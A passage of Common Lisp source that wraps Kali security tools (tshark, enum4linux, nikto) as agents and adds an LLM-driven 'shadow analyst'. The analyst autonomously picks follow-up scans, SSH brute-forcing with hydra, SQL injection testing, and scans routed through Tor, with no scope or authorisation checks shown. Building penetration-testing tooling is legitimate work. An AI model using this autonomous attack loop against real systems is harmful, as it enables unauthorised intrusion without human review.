;; and print a decoded form of those packets to standard output or write
them to a file.

(defun make-tshark-agent (interface &key (filter nil)
                                          (duration 60)
                                          (output-file nil)
                                          (max-packets nil)
                                          (resolve-names t))
  "Create a TShark packet capture agent.

TShark is the command-line sibling of Wireshark. It excels at scripted
capture, automated analysis, and integration with other tools. This
wrapper configures it for time-bounded capture with optional display
filtering.

Parameters:
  INTERFACE    — Network interface to capture on (e.g., \"eth0\", \"wlan0\",
                 \"any\" for all interfaces, \"lo\" for loopback).
  FILTER       — Optional display filter using Wireshark filter syntax.
                 Examples: \"tcp.port==80\", \"dns\", \"http.request\",
                 \"ssl.handshake.type==1\", \"smb.cmd==0x73\".
  DURATION     — Capture duration in seconds (default 60). Set to NIL for
                 indefinite capture (not recommended without max-packets).
  OUTPUT-FILE  — Optional path to write the capture file (.pcap format).
                 If not specified, only text output is produced.
  MAX-PACKETS  — Stop after capturing this many packets (optional).
  RESOLVE-NAMES — If T (default), resolve IP addresses to hostnames and
                  port numbers to service names.

Returns: A configured KALI-AGENT instance.

Example:
  ;; Capture all HTTP traffic for 5 minutes
  (make-tshark-agent \"eth0\"
                     :filter \"tcp.port==80\"
                     :duration 300
                     :output-file \"/tmp/http-capture.pcap\")

  ;; Quick DNS query capture
  (make-tshark-agent \"any\"
                     :filter \"dns\"
                     :duration 30
                     :max-packets 1000)

  ;; Capture SSL handshakes with no name resolution (faster)
  (make-tshark-agent \"eth0\"
                     :filter \"ssl.handshake\"
                     :resolve-names nil
                     :duration 120)

NOTE: Packet capture requires root privileges or CAP_NET_RAW capability.
Run with sudo or set the capability: sudo setcap cap_net_raw+eip $(which tshark)

Thread-safety: Creates a new agent. Safe from any thread."
  (let* ((binary (or (find-kali-binary "tshark")
                     (warn "[KALI] tshark not found. Install with: apt install tshark")))
         (args (append
                (list "-i" interface)
                (unless resolve-names '("-n"))
                (when filter (list "-f" filter))
                (when output-file (list "-w" output-file))
                (when max-packets (list "-c" (prin1-to-string max-packets)))
                ;; Text output format: one-line summary per packet
                '("-T" "fields"
                  "-e" "frame.number"
                  "-e" "frame.time_relative"
                  "-e" "ip.src"
                  "-e" "ip.dst"
                  "-e" "tcp.srcport"
                  "-e" "tcp.dstport"
                  "-e" "_ws.col.Protocol"
                  "-e" "_ws.col.Info"))))
    (make-instance 'kali-agent
                   :binary (or binary "tshark")
                   :args (alexandria:flatten args)
                   :tool-category :wireless
                   :target interface
                   :capabilities '(:packet-capture :protocol-analysis :traffic-monitoring)
                   :timeout (or duration 60)
                   :restart-policy #'kali-default-restart-policy)))

;; ───────────────────────────────────────────────────────────────────────────
;; 5.11 ENUM4LINUX — SMB Enumeration
;; ───────────────────────────────────────────────────────────────────────────
;;
;; enum4linux is a tool for enumerating information from Windows and Samba
;; systems through SMB. It attempts to offer similar functionality to
;; enum.exe formerly available from www.bindview.com.

(defun make-enum4linux-agent (target &key (options '(-a)))
  "Create an enum4linux SMB enumeration agent.

enum4linux extracts a wealth of information from SMB services:
  • User lists (via RID cycling, SAMR queries)
  • Share names and permissions
  • Password policies
  • Group memberships
  • OS and domain information
  • NTLMSSP authentication details

Parameters:
  TARGET  — The IP address or hostname of the SMB server to enumerate.
  OPTIONS — List of option flags. Default is (-a) for all checks.
            Common options: -U (users), -S (shares), -G (groups),
            -P (password policy), -o (OS info), -n (nmblookup).

Returns: A configured KALI-AGENT instance.

Example:
  ;; Full enumeration
  (make-enum4linux-agent \"192.168.1.10\")

  ;; Enumerate users and shares only
  (make-enum4linux-agent \"10.0.0.5\"
                         :options '(-U -S))

  ;; Quick OS and domain info
  (make-enum4linux-agent \"target.com\"
                         :options '(-o -n))

NOTE: SMB enumeration can generate significant network traffic and may
be logged by the target system. Some operations require guest or
authenticated access.

Thread-safety: Creates a new agent. Safe from any thread."
  (let* ((binary (or (find-kali-binary "enum4linux")
                     (warn "[KALI] enum4linux not found. Install with: apt install enum4linux")))
         (args (append (alexandria:flatten (mapcar (lambda (o) (prin1-to-string o)) options))
                       (list target))))
    (make-instance 'kali-agent
                   :binary (or binary "enum4linux")
                   :args args
                   :tool-category :recon
                   :target target
                   :capabilities '(:smb-enumeration :user-enumeration :share-discovery)
                   :timeout 300
                   :restart-policy #'kali-default-restart-policy)))

;; ───────────────────────────────────────────────────────────────────────────
;; 5.12 NIKTO — Web Vulnerability Scanner
;; ───────────────────────────────────────────────────────────────────────────
;;
;; Nikto is an Open Source web server scanner which performs comprehensive
tests against web servers for multiple items, including over 6700
potentially dangerous files/programs.

(defun make-nikto-agent (target &key (port 80)
                                      (ssl nil)
                                      (tuning nil))
  "Create a Nikto web vulnerability scanning agent.

Nikto checks for:
  • Over 6,700 dangerous files/CGIs
  • Outdated server software (1,250+ versions)
  • Server-specific problems (270+ versions)
  • Indexing of root directories
  • HTTP methods and OPTIONS
  • SSL/TLS certificate issues
  • Misconfigurations and informational disclosures

Parameters:
  TARGET  — The target URL or IP address (e.g., \"http://target.com\"
            or \"192.168.1.10\").
  PORT    — Target port (default 80 for HTTP, 443 for HTTPS).
  SSL     — If T, use HTTPS (port defaults to 443).
  TUNING  — Optional tuning string to select specific test categories.
            Examples: \"123\" (file/content/errors), \"x56\" (all + SSL).

Returns: A configured KALI-AGENT instance.

Example:
  ;; Basic HTTP scan
  (make-nikto-agent \"http://target.com\")

  ;; HTTPS scan on custom port
  (make-nikto-agent \"https://target.com\"
                    :port 8443
                    :ssl t)

  ;; Targeted scan focusing on files and SSL
  (make-nikto-agent \"http://target.com\"
                    :tuning \"123x56\")

Thread-safety: Creates a new agent. Safe from any thread."
  (let* ((binary (or (find-kali-binary "nikto")
                     (warn "[KALI] nikto not found. Install with: apt install nikto")))
         (protocol (if ssl "https" "http"))
         (actual-port (if ssl (or port 443) port))
         (host (if (search "://" target)
                   target
                   (format nil "~A://~A" protocol target)))
         (args (append
                (list "-h" host
                      "-p" (prin1-to-string actual-port))
                (when tuning (list "-Tuning" tuning))
                '("-Display" "V"))))  ; Verbose display showing findings
    (make-instance 'kali-agent
                   :binary (or binary "nikto")
                   :args (alexandria:flatten args)
                   :tool-category :web
                   :target host
                   :capabilities '(:web-vuln-scan :cgi-scan :ssl-check :info-disclosure)
                   :timeout 600
                   :restart-policy #'kali-default-restart-policy)))


;; ═══════════════════════════════════════════════════════════════════════════
;; Section 6: Default Kali Agent Strategy & Restart Policy
;; ═══════════════════════════════════════════════════════════════════════════
;;
;; Every Kali agent needs a strategy function that drives its behavior.
;; The default strategy runs the tool and continuously captures output
;; until the process exits, a timeout occurs, or the agent is stopped.
;;
;; The restart policy handles the specific failure modes of external
;; tool processes: timeouts, crashes, non-zero exit codes, and hung
;; processes.

(defun kali-default-strategy (agent)
  "Default strategy for KALI-AGENT instances.

This strategy implements the following loop:
  1. If the process is not running, call RUN-TOOL to launch it.
  2. Capture available output via CAPTURE-OUTPUT.
  3. Check if the process has exited (success or failure).
  4. If exited, update status (:COMPLETED or :FAILED) and exit the loop.
  5. If timeout exceeded, call STOP-TOOL and set status :PAUSED.
  6. Yield (SLEEP 0.1) to avoid busy-waiting.

This strategy is installed automatically by tool wrapper functions
unless overridden. It is suitable for most tools that run to completion
(nmap, sqlmap, dirb, etc.). Tools that require interactive control
(Metasploit meterpreter) should use a custom strategy.

Parameters:
  AGENT — The KALI-AGENT executing this strategy.

Returns: A status keyword (:COMPLETED, :FAILED, :PAUSED, or :TIMEOUT).

Side effects:
  • May launch/terminate OS processes.
  • Mutates the agent's output buffer and findings.
  • Broadcasts to gossip topics and telemetry.

Thread-safety: This strategy is called by the agent's execution thread
  (spawned by the orchestrator). It acquires necessary locks internally.
  Not safe to call from multiple threads on the same agent.

Example of custom strategy:
  ;; A strategy that restarts the tool on failure with exponential backoff
  (defun resilient-kali-strategy (agent)
    (loop for attempt from 1 to 3
          do (kali-default-strategy agent)
          when (eq (agent-status agent) :completed)
            return :completed
          do (let ((backoff (expt 2 attempt)))
               (format t \"~&[KALI] Retry ~A/~A after ~As...\"
                       attempt 3 backoff)
               (sleep backoff))
          finally (return :failed)))"
  ;; Step 1: Launch if not running
  (unless (and (agent-process agent)
               (uiop:process-alive-p (agent-process agent)))
    (run-tool agent))
  ;; Main capture loop
  (loop
    ;; Step 2: Capture output
    (capture-output agent)
    ;; Step 3: Check process status
    (let ((process (agent-process agent)))
      (cond
        ;; Process finished
        ((or (null process)
             (not (uiop:process-alive-p process)))
         (let ((exit-code (when process
                            (handler-case
                                (uiop:wait-process process)
                              (error () -1)))))
           (bt:with-lock-held ((agent-lock agent))
             (if (and exit-code (zerop exit-code))
                 (setf (agent-status agent) :completed)
                 (setf (agent-status agent) :failed)))
           (publish-message :swarm.kali.status
                            `(:event :tool-finished
                              :agent-id ,(agent-id agent)
                              :exit-code ,(or exit-code -1)
                              :status ,(agent-status agent)
                              :timestamp ,(local-time:now)))
           (return (agent-status agent))))
        ;; Step 5: Check timeout
        ((and (agent-timeout agent)
              (agent-start-time agent)
              (> (local-time:timestamp-difference
                  (local-time:now)
                  (agent-start-time agent))
                 (agent-timeout agent)))
         (format t "~&[KALI] Agent ~A timed out after ~As. Stopping.~%"
                 (agent-id agent) (agent-timeout agent))
         (stop-tool agent)
         (bt:with-lock-held ((agent-lock agent))
           (setf (agent-status agent) :paused))
         (return :timeout)))
    ;; Step 6: Yield
    (sleep 0.1)))

(defun kali-default-restart-policy (condition agent)
  "Restart policy specialized for Kali tool agents.

This policy extends the orchestrator's default restart policy with
Kali-specific heuristics. It understands the unique failure modes of
external processes and makes appropriate recovery decisions.

Decision table:
  EXTERNAL-TIMEOUT  → :RETRY (up to 3 times), then :USE-FALLBACK
  PROCESS-CRASH     → :RETRY once, then :REPLACE-AGENT
  RESOURCE-EXHAUSTED → :PAUSE-AND-SELF-MODIFY (reduce args)
  STRATEGY-STALLED  → :HOTFIX-AND-CONTINUE (new strategy)
  Repeated failures (> 3 errors) → :REPLACE-AGENT
  Otherwise         → :ESCALATE

Parameters:
  CONDITION — The condition that triggered healing.
  AGENT     — The KALI-AGENT being healed.

Returns: A restart keyword.

Thread-safety: Called by the orchestrator's monitor loop. Does not
  mutate agent state — only returns a decision keyword."
  (typecase condition
    (external-timeout
     ;; Timeouts are common for network tools — retry a few times
     (if (< (agent-error-count agent) 3)
         :retry
         :use-fallback))
    (resource-exhausted
     ;; Resource issues: reduce tool arguments and try again
     :pause-and-self-modify)
    (strategy-stalled
     ;; Strategy is stuck: hot-patch with a simpler strategy
     :hotfix-and-continue)
    (agent-failure
     ;; Repeated agent failures: replace the whole agent
     (if (> (agent-error-count agent) 3)
         :replace-agent
         :retry))
    (otherwise
     ;; Unknown condition: escalate to orchestrator
     :escalate)))

;; ═══════════════════════════════════════════════════════════════════════════
;; Section 7: Shadow Agent Pattern — Observer + Analyst
;; ═══════════════════════════════════════════════════════════════════════════
;;
;; The Shadow Agent Pattern is one of LISPMIND's most powerful features.
;; It pairs two agents:
;;   • SHADOW-OBSERVER (a KALI-AGENT subclass) — runs the tool and captures
;;     output, exactly like a normal Kali agent.
;;   • SHADOW-ANALYST (a base AGENT subclass) — consumes the observer's
;;     parsed findings, feeds them to a local LLM, and makes autonomous
;;     decisions about next steps.
;;
;; This pattern enables autonomous penetration testing: the observer
;; gathers intelligence, the analyst interprets it, and together they
;; decide what to scan next, what vulnerabilities to pursue, or when to
;; stop and report.
;;
;; ARCHITECTURE
;; ─────────────
;;   SHADOW-OBSERVER                    SHADOW-ANALYST
;;   ┌─────────────────┐               ┌─────────────────┐
;;   │ Runs Kali tool  │──output──────►│ Parses findings │
;;   │ Captures output │──findings────►│ Feeds to LLM    │
;;   │ Broadcasts raw  │               │ Decides next    │
;;   │   to gossip     │◄───commands───│   action        │
;;   └─────────────────┘               └─────────────────┘
;;
;; The analyst can send commands back to the observer (via the agent's
;; state hash-table) to adjust tool arguments, change targets, or launch
;; follow-up tools.

(defclass shadow-observer (kali-agent)
  ((analysis-agent :initform nil
                   :accessor observer-analysis-agent
                   :documentation
                   "Reference to the paired SHADOW-ANALYST agent.
            Set by SPAWN-SHADOW-PAIR. The observer sends its
            findings to this agent for analysis.")

   (analysis-buffer :initform '()
                    :accessor observer-analysis-buffer
                    :documentation
                    "Queue of findings pending analysis.
            New findings from PARSE-FINDINGS are pushed here.
            The analyst's strategy drains this queue."))

  (:documentation
   "Shadow Observer: A Kali agent that runs a security tool and pipes
its output to a paired analyst agent.

The observer extends KALI-AGENT with:
  • A reference to its paired ANALYSIS-AGENT
  • An analysis buffer that queues findings for the analyst
  • Modified CAPTURE-OUTPUT that automatically forwards findings

The observer's behavior is identical to a standard Kali agent except
that every parsed finding is also pushed to the analysis buffer and
sent to the analyst agent via the messaging system.

Use SPAWN-SHADOW-PAIR to create a properly linked observer+analyst pair."))

(defclass shadow-analyst (agent)
  ((observed-agent :initarg :observed-agent
                   :accessor analyst-observed-agent
                   :documentation
                   "Reference to the SHADOW-OBSERVER this analyst watches.
            The analyst reads the observer's findings and can send
            commands back by mutating the observer's state.")

   (llm-prompt-template :initform "Analyze this security tool output and recommend next actions. Findings: ~A. Current target: ~A."
                        :accessor analyst-prompt-template
                        :documentation
                        "Template string for generating LLM prompts.
            The ~A placeholders are filled with:
              1. The serialized findings list
              2. The current target
            Override this for domain-specific analysis prompts.")

   (llm-endpoint :initform "http://localhost:11434/api/generate"
                 :accessor analyst-llm-endpoint
                 :documentation
                 "URL of the local LLM API endpoint.
            Default is Ollama's generate API running locally.
            Can be changed to any OpenAI-compatible endpoint:
              • Ollama: http://localhost:11434/api/generate
              • LocalAI: http://localhost:8080/v1/chat/completions
              • llama.cpp: http://localhost:8080/completion")

   (llm-model :initform "llama3.1"
              :accessor analyst-llm-model
              :documentation
              "Name of the LLM model to use for analysis.
            Must be available at the configured LLM endpoint.
            Examples: 'llama3.1', 'codellama', 'mistral', 'mixtral'.
            Smaller models (7B parameters) are faster; larger models
            (70B) provide better security analysis.")

   (decision-history :initform '()
                     :accessor analyst-decision-history
                     :documentation
                     "Log of all analyst decisions with timestamps.
            Each entry: (:timestamp <time> :findings <count>
                         :decision <keyword> :rationale <string>)
            Used for audit trails and improving decision quality."))

  (:documentation
   "Shadow Analyst: An agent that reads a Kali tool's findings, consults
a local LLM, and makes autonomous decisions about next steps.

The analyst's strategy loop:
  1. Check if the observed agent has new findings.
  2. Serialize findings into an LLM prompt using the template.
  3. Send the prompt to the local LLM endpoint.
  4. Parse the LLM's response for actionable decisions.
  5. Execute the decision (adjust target, change tool args, stop, etc.).
  6. Log the decision and rationale.

Decisions are keywords like:
  :CONTINUE    — Keep observing, no action needed.
  :ESCALATE    — Findings are significant; escalate to human or orchestrator.
  :PIVOT       — Switch to a different target or tool based on findings.
  :DEEPEN      — Increase scan depth/level based on promising findings.
  :STOP        — Sufficient intelligence gathered; stop the observer.
  :FOLLOW-UP   — Launch a follow-up tool (e.g., found a port → nmap it).

The analyst is a full AGENT citizen: it has health, heartbeat, strategy,
and can be healed by the orchestrator. It typically runs in parallel with
its observer, both registered in the orchestrator's agent registry."))

;; ───────────────────────────────────────────────────────────────────────────
;; Shadow Pattern: Specialized Methods
;; ───────────────────────────────────────────────────────────────────────────

(defmethod capture-output :after ((agent shadow-observer))
  "After capturing output, forward any new findings to the paired analyst.

This :AFTER method runs after the primary CAPTURE-OUTPUT method. It
checks if there are new findings and sends them to the analyst agent
via the inter-agent messaging system (if available) or directly through
the analysis buffer.

The findings are also broadcast to the gossip topic
:swarm.kali.shadow-analysis so that remote nodes can observe the
shadow pair's analysis pipeline."
  (when (observer-analysis-agent agent)
    (let ((new-findings (agent-findings agent))
          (analyst (observer-analysis-agent agent)))
      ;; Push findings to the analysis buffer
      (setf (observer-analysis-buffer agent)
            (append (observer-analysis-buffer agent) new-findings))
      ;; Send to analyst via messaging if orchestrator is available
      (when *default-orchestrator*
        (send-message *default-orchestrator*
                      (agent-id agent)
                      (agent-id analyst)
                      `(:type :findings
                        :source ,(agent-id agent)
                        :findings ,new-findings
                        :timestamp ,(local-time:now))))
      ;; Broadcast to shadow analysis topic
      (when new-findings
        (publish-message :swarm.kali.shadow-analysis
                         `(:observer ,(agent-id agent)
                           :analyst ,(agent-id analyst)
                           :findings-count ,(length new-findings)
                           :timestamp ,(local-time:now)))))))

(defun shadow-analyst-strategy (agent)
  "Strategy function for SHADOW-ANALYST agents.

This strategy implements the analysis loop described in the class
documentation. It polls the observed agent's findings, consults the
LLM, and makes decisions.

Parameters:
  AGENT — The SHADOW-ANALYST executing this strategy.

Returns: The decision keyword from the most recent analysis cycle.

NOTE: LLM integration requires a running Ollama/LocalAI instance at
the configured endpoint. If the LLM is unavailable, the analyst falls
back to rule-based decision making (simple heuristics on findings)."
  (let ((observer (analyst-observed-agent agent)))
    (unless observer
      (warn "[SHADOW] Analyst ~A has no observed agent." (agent-id agent))
      (return-from shadow-analyst-strategy :no-observer))
    ;; Check if there are findings to analyze
    (let ((findings (observer-analysis-buffer observer)))
      (when findings
        ;; Clear the buffer (we're consuming these findings)
        (setf (observer-analysis-buffer observer) nil)
        ;; Build and send LLM prompt
        (let* ((findings-str (format nil "~S" findings))
               (target (agent-target observer))
               (prompt (format nil (analyst-prompt-template agent)
                               findings-str target)))
          (handler-case
              (let ((decision (query-llm-for-decision
                               agent prompt findings target)))
                ;; Execute the decision
                (execute-analyst-decision agent observer decision findings)
                ;; Log the decision
                (push `(:timestamp ,(local-time:now)
                        :findings ,(length findings)
                        :decision ,(getf decision :action)
                        :rationale ,(getf decision :rationale))
                      (analyst-decision-history agent))
                decision)
            (error (e)
              (warn "[SHADOW] LLM query failed for analyst ~A: ~A"
                    (agent-id agent) e)
              ;; Fallback to rule-based decision
              (let ((fallback-decision (rule-based-decision findings target)))
                (execute-analyst-decision agent observer fallback-decision findings)
                fallback-decision))))))))

(defun query-llm-for-decision (analyst prompt findings target)
  "Send a prompt to the local LLM and parse the response into a decision.

This function:
  1. Constructs a JSON payload for the LLM API.
  2. Sends it via HTTP POST (using DRAKMA or bare sockets).
  3. Parses the JSON response.
  4. Extracts the decision keyword and rationale.

If the LLM is not available, signals an error that triggers the
rule-based fallback in SHADOW-ANALYST-STRATEGY.

Parameters:
  ANALYST   — The SHADOW-ANALYST making the query.
  PROMPT    — The formatted prompt string.
  FINDINGS  — The raw findings list (for context).
  TARGET    — The current target (for context).

Returns: A decision plist: (:ACTION <keyword> :RATIONALE <string> :NEXT-STEPS <list>).

Example LLM response format:
  {
    \"action\": \"PIVOT\",
    \"rationale\": \"Found open SMB port; suggest enumerating shares\",
    \"next_steps\": [\"enum4linux\", \"smbclient\"]
  }"
  (declare (ignore findings target))
  ;; Try to use DRAKMA for HTTP if available
  (handler-case
      (progn
        ;; Note: This is a template. Actual HTTP request requires DRAKMA
        ;; or similar library. The implementation below is a placeholder
        ;; that demonstrates the expected API structure.
        (let* ((payload
                (format nil "{\"model\": \"~A\", \"prompt\": ~S, \"stream\": false}"
                        (analyst-llm-model analyst)
                        prompt))
               ;; Placeholder: actual HTTP POST would go here
               ;; (response-body (drakma:http-request (analyst-llm-endpoint analyst)
               ;;                                    :method :post
               ;;                                    :content-type "application/json"
               ;;                                    :content payload))
               (response-body "{\"action\": \"CONTINUE\", \"rationale\": \"No critical findings yet.\", \"next_steps\": []}"))
          ;; Parse the JSON response
          (let* ((response (cl-json:decode-json-from-string response-body))
                 (action (cdr (assoc :action response)))
                 (rationale (cdr (assoc :rationale response)))
                 (next-steps (cdr (assoc :next--steps response))))
            `(:action ,(intern (string-upcase (or action "CONTINUE")) :keyword)
              :rationale ,(or rationale "No rationale provided.")
              :next-steps ,(or next-steps nil)))))
    (error (e)
      (error "LLM query failed: ~A" e))))

(defun rule-based-decision (findings target)
  "Make a decision based on heuristics when the LLM is unavailable.

This function implements simple rule-based analysis of findings:
  • Critical findings (exploits, credentials) → :ESCALATE
  • Open ports on important services           → :FOLLOW-UP
  • SQL injection or high-severity vulns       → :DEEPEN
  • Many findings on same target               → :PIVOT
  • No interesting findings after many scans   → :STOP
  • Default                                    → :CONTINUE

Parameters:
  FINDINGS — List of parsed finding plists.
  TARGET   — The current target string.

Returns: A decision plist compatible with EXECUTE-ANALYST-DECISION."
  (declare (ignore target))
  (let ((critical-count 0)
        (high-count 0)
        (open-ports 0)
        (interesting-services nil))
    ;; Categorize findings
    (dolist (f findings)
      (let ((severity (getf f :severity))
            (type (getf f :type)))
        (when (eq severity :critical) (incf critical-count))
        (when (eq severity :high) (incf high-count))
        (when (eq type :open-port)
          (incf open-ports)
          (push (getf f :service) interesting-services))))
    ;; Decision rules
    (cond
      ;; Critical findings demand immediate escalation
      ((> critical-count 0)
       `(:action :escalate
         :rationale ,(format nil "Found ~A critical finding(s): ~A"
                             critical-count
                             (mapcar (lambda (f) (getf f :type))
                                     (remove-if-not (lambda (f)
                                                      (eq (getf f :severity) :critical))
                                                    findings)))
         :next-steps (human-review)))
      ;; High-severity findings warrant deeper investigation
      ((> high-count 2)
       `(:action :deepen
         :rationale ,(format nil "Found ~A high-severity findings. Recommend deeper scan."
                             high-count)
         :next-steps (increase-scan-depth)))
      ;; Interesting services found — follow up with specialized tools
      ((> open-ports 0)
       `(:action :follow-up
         :rationale ,(format nil "Found ~A open port(s) with services: ~A"
                             open-ports interesting-services)
         :next-steps ,(remove-duplicates
                        (mapcar (lambda (svc)
                                  (cond
                                    ((search "http" (string-downcase (or svc ""))) :nikto)
                                    ((search "smb" (string-downcase (or svc ""))) :enum4linux)
                                    ((search "ssh" (string-downcase (or svc ""))) :hydra)
                                    ((search "mysql" (string-downcase (or svc ""))) :sqlmap)
                                    (t :nmap)))
                                interesting-services))))
      ;; Nothing interesting — continue or stop if we've been at it a while
      ((> (length findings) 100)
       `(:action :stop
         :rationale "Scanned extensively with no significant findings."
         :next-steps nil))
      ;; Default: keep observing
      (t
       `(:action :continue
         :rationale "No actionable findings yet."
         :next-steps nil)))))

(defun execute-analyst-decision (analyst observer decision findings)
  "Execute a decision returned by the LLM or rule-based system.

This function implements the action side of the analysis loop:
  • :CONTINUE  — Do nothing, keep observing.
  • :ESCALATE  — Publish a threat alert to gossip and telemetry.
  • :PIVOT     — Change the observer's target.
  • :DEEPEN    — Increase the observer's scan depth/arguments.
  • :STOP      — Call STOP-TOOL on the observer.
  • :FOLLOW-UP — Launch a new tool based on findings.

Parameters:
  ANALYST   — The SHADOW-ANALYST that made the decision.
  OBSERVER  — The SHADOW-OBSERVER to act upon.
  DECISION  — A decision plist from QUERY-LLM-FOR-DECISION or
              RULE-BASED-DECISION.
  FINDINGS  — The findings that led to this decision.

Returns: The action keyword that was executed.

Side effects: May mutate observer state, launch new agents, or broadcast
  alert messages."
  (let ((action (getf decision :action)))
    (case action
      (:continue
       ;; Nothing to do — the observer keeps running
       (format t "~&[SHADOW] Analyst ~A: continuing observation.~%"
               (agent-id analyst)))

      (:escalate
       ;; Broadcast a threat alert
       (format t "~&[SHADOW] Analyst ~A: ESCALATING findings!~%"
               (agent-id analyst))
       (publish-message :swarm.kali.threats
                        `(:severity :critical
                          :observer ,(agent-id observer)
                          :analyst ,(agent-id analyst)
                          :findings ,findings
                          :rationale ,(getf decision :rationale)
                          :timestamp ,(local-time:now)))
       (record-telemetry-event :kali-threat-escalated
                               :analyst-id (agent-id analyst)
                               :observer-id (agent-id observer)
                               :findings-count (length findings)))

      (:pivot
       ;; Change target based on analyst recommendation
       (let ((new-target (or (first (getf decision :next-steps))
                             (agent-target observer))))
         (format t "~&[SHADOW] Analyst ~A: pivoting to target ~A.~%"
                 (agent-id analyst) new-target)
         (stop-tool observer)
         (setf (agent-target observer) new-target)
         ;; Rebuild args with new target (tool-specific)
         (setf (agent-args observer)
               (substitute new-target (agent-target observer)
                           (agent-args observer) :test #'string=))
         (run-tool observer)))

      (:deepen
       ;; Increase scan depth
       (format t "~&[SHADOW] Analyst ~A: deepening scan.~%"
               (agent-id analyst))
       (stop-tool observer)
       ;; Append depth-increasing flags (tool-specific heuristic)
       (setf (agent-args observer)
             (append (agent-args observer) '("-A" "--script=vuln")))
       (run-tool observer))

      (:stop
       ;; Stop the observer
       (format t "~&[SHADOW] Analyst ~A: stopping observer ~A.~%"
               (agent-id analyst) (agent-id observer))
       (stop-tool observer))

      (:follow-up
       ;; Launch follow-up tools
       (dolist (tool-type (getf decision :next-steps))
         (when (keywordp tool-type)
           (format t "~&[SHADOW] Analyst ~A: launching follow-up tool ~A.~%"
                   (agent-id analyst) tool-type)
           (handler-case
               (let ((new-agent (spawn-tool tool-type (agent-target observer))))
                 (when new-agent
                   (register-agent *default-orchestrator* new-agent)))
             (error (e)
               (warn "[SHADOW] Failed to launch follow-up tool ~A: ~A"
                     tool-type e))))))

      (otherwise
       (warn "[SHADOW] Unknown decision action: ~A" action)))
    action))

(defun spawn-shadow-pair (tool-type target &key (llm-model "llama3.1")
                                                  (llm-endpoint "http://localhost:11434/api/generate"))
  "Spawn a Shadow Observer + Analyst agent pair.

This is the high-level constructor for the Shadow Agent Pattern. It:
  1. Creates a SHADOW-OBSERVER for the specified tool and target.
  2. Creates a SHADOW-ANALYST linked to the observer.
  3. Sets the observer's analysis-agent slot to point to the analyst.
  4. Registers both agents with the orchestrator.
  5. Returns both agents as values.

Parameters:
  TOOL-TYPE   — Keyword naming the tool: :NMAP, :SQLMAP, :DIRB, etc.
  TARGET      — The target for the tool (IP, URL, etc.).
  LLM-MODEL   — LLM model name for the analyst (default 'llama3.1').
  LLM-ENDPOINT — LLM API URL (default Ollama local endpoint).

Returns: Two values — (values OBSERVER ANALYST).

Example:
  ;; Spawn a shadow pair for network reconnaissance
  (multiple-value-bind (obs ana)
      (spawn-shadow-pair :nmap \"192.168.1.0/24\")
    (format t \"Observer: ~A, Analyst: ~A~%\" (agent-id obs) (agent-id ana)))

  ;; With custom LLM configuration
  (spawn-shadow-pair :sqlmap \"http://target.com/page.php?id=1\"
                     :llm-model \"codellama\"
                     :llm-endpoint \"http://10.0.0.5:11434/api/generate\")

Thread-safety: Creates new instances, no global mutation except
  orchestrator registration. Safe from any thread."
  ;; Step 1: Create the observer (the tool-running agent)
  (let* ((observer (case tool-type
                     (:nmap (make-nmap-agent target))
                     (:sqlmap (make-sqlmap-agent target))
                     (:dirb (make-dirb-agent target))
                     (:hydra (make-hydra-agent target "ssh"))
                     (:nikto (make-nikto-agent target))
                     (:enum4linux (make-enum4linux-agent target))
                     (otherwise (error "[SHADOW] Unsupported tool type: ~A" tool-type)))))
    ;; Change class to shadow-observer
    (change-class observer 'shadow-observer)
    ;; Step 2: Create the analyst
    (let ((analyst (make-instance 'shadow-analyst
                                  :observed-agent observer
                                  :llm-model llm-model
                                  :llm-endpoint llm-endpoint
                                  :strategy #'shadow-analyst-strategy
                                  :capabilities '(:security-analysis :llm-consultation
                                                 :autonomous-decision :thassessment)
                                  :restart-policy #'kali-default-restart-policy)))
      ;; Step 3: Link them
      (setf (observer-analysis-agent observer) analyst)
      ;; Step 4: Register with orchestrator if available
      (when *default-orchestrator*
        (register-agent *default-orchestrator* observer)
        (register-agent *default-orchestrator* analyst))
      ;; Step 5: Publish pair creation event
      (publish-message :swarm.kali.status
                       `(:event :shadow-pair-created
                         :observer ,(agent-id observer)
                         :analyst ,(agent-id analyst)
                         :tool ,tool-type
                         :target ,target
                         :timestamp ,(local-time:now)))
      ;; Return both
      (values observer analyst))))


;; ═══════════════════════════════════════════════════════════════════════════
;; Section 8: Interactive REPL Commands — Human Interface to the Arsenal
;; ═══════════════════════════════════════════════════════════════════════════
;;
;; These functions are designed for interactive use at the REPL. They
;; provide a high-level, human-friendly interface to the Kali integration
;; without requiring knowledge of the underlying agent machinery.
;;
;; All commands follow a consistent naming convention:
;;   SPAWN-TOOL    — Create and launch a tool agent
;;   LIST-*        — Display information
;;   KILL-*        — Terminate processes
;;   GET-*         — Retrieve data

(defun spawn-tool (tool-type target &rest kwargs)
  "High-level REPL command: spawn a Kali tool agent and run it.

This is the primary entry point for interactive tool usage. It creates
a tool agent of the specified type, registers it with the orchestrator,
and immediately launches the tool.

Parameters:
  TOOL-TYPE — Keyword naming the tool to spawn:
                :NMAP         — Network mapper (reconnaissance)
                :SQLMAP       — SQL injection tester
                :DIRB         — Directory brute-forcer
                :HYDRA        — Login brute-forcer (requires :SERVICE keyword)
                :JOHN         — Password cracker (hash file as target)
                :HASHCAT      — GPU password cracker (hash file as target)
                :AIRCRACK     — Wireless capture tool
                :TSHARK       — Packet capture analyzer
                :PROXYCHAINS  — Anonymized tool wrapper
                :NIKTO        — Web vulnerability scanner
                :ENUM4LINUX   — SMB enumeration tool
                :METASPLOIT   — Exploitation framework
                :SHADOW       — Spawn a shadow observer+analyst pair
  TARGET    — The target (IP, URL, hash file path, interface name, etc.).
              Meaning depends on the tool type.
  KWARGS    — Additional keyword arguments forwarded to the tool's
              constructor. See the individual MAKE-*-AGENT functions
              for available options.

Returns: The spawned KALI-AGENT instance, or (values OBSERVER ANALYST)
         for :SHADOW tool-type.

Examples:
  ;; Quick nmap scan
  (spawn-tool :nmap \"192.168.1.1\")

  ;; Full nmap scan with options
  (spawn-tool :nmap \"10.0.0.0/24\"
              :args '(\"-sS\" \"-A\" \"-T4\")
              :ports \"1-65535\")

  ;; SQL injection test
  (spawn-tool :sqlmap \"http://target.com/page.php?id=1\"
              :level 2 :risk 1)

  ;; Shadow pair for autonomous recon
  (spawn-tool :shadow :nmap \"192.168.1.0/24\")

  ;; Anonymous scan through Tor
  (spawn-tool :proxychains :nmap \"target.com\")

Error handling: If the tool binary is not found, prints a warning and
returns NIL. If the orchestrator is not running, the agent is created
but not registered — call REGISTER-KALI-AGENT manually."
  ;; Handle shadow pair specially
  (when (eq tool-type :shadow)
    (let ((inner-tool (or (getf kwargs :inner-tool) :nmap)))
      (return-from spawn-tool
